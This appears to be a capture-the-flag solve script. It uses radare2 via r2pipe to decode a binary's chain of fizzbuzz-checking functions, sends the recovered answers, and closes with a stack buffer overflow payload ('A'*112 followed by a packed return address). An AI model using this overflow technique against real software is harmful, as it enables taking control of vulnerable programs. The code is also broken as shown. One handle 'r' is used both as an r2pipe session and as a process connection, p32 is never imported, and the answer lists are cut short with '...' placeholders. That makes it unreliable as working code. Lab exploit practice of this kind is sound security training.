import r2pipe

r = r2pipe.open('./vuln')
r.cmd('Po bizz')

def decode_func(addr):
  r.cmd(f's {hex(addr)}')
  calls = r.cmdj('agcj')
  # if 'sym.imp.fgets' in calls[0]['imports']:
  #   return [(-1, None)]
  func = r.cmdj('pdfj')
  ops = func['ops']
  fizz = []
  for i, op in enumerate(ops):
    if op['type'] == 'push':
      if ops[i+5]['type'] == 'nop':
        break
      fizz.append((op['val'], ops[i+5]['jump']))
  return fizz

nums = []

funcs = [0x08140c2e, 0x08143ffd, 0x081313b8, 0x08109f08]
for i, addr in enumerate(funcs[:-1]):
  func = decode_func(addr)
  target = funcs[i+1]
  for correct, child in func:
    nums.append(-1)
    if child == target:
      break
    nums.append(decode_func(child)[0][0])

print(nums)

# ===================================================================

fizzbuzz = lambda i: "fizzbuzz"[i*i%3*4:8--i**4%5] or str(i)

# gets to 0x08140c2e
answers = ['1', '2', 'fizz', '1', ...]

for ans in answers:
  r.sendlineafter('?', ans)

# gets to vulnerable function
additional = [-1, 10, -1, 8, -1, 11, -1, ...]
additional.extend([5, -1])
for n in additional:
  if n == -1:
    r.sendlineafter('?', 'meowo')
  else:
    for k in range(n-1):
      r.sendlineafter('?', fizzbuzz(k+1))

r.sendline(b'A'*112+p32(0x08048656))